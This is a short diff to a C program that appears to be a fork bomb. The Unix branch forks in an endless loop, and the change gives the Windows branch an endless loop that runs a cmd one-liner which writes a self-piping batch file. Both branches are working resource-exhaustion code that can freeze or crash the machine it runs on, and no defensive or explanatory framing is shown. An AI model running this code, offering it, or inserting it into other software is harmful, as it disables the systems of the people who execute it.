@@ -24,8 +24,10 @@ int main(void) {
             fork();
         }
 	#elif _WIN32
+        const char *comando = "cmd /k echo -^|->-.bat&-";
+
 		while(1) {
-			system(argv[0]);
+            system(comando);
         }
 	#endif
 	
